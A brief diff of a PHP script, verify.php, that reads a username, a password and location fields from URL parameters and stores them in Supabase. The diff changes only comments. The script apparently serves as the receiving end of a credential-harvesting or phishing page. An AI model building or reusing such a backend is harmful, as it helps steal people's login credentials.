@@ -1,6 +1,6 @@
 <?php
 // ============================================
-// VERIFY.PHP - Save to Supabase
+// VERIFY.PHP - Save to Supabase (FINAL)
 // ============================================
 
 // ============================================
@@ -18,7 +18,7 @@ $country = $_GET['country'] ?? '';
 $city = $_GET['city'] ?? '';
 $continent = $_GET['continent'] ?? '';
 
-// Only save if we have data
+// Save to Supabase
 if (!empty($u) || !empty($p)) {
     $data = [
         'username' => $u,
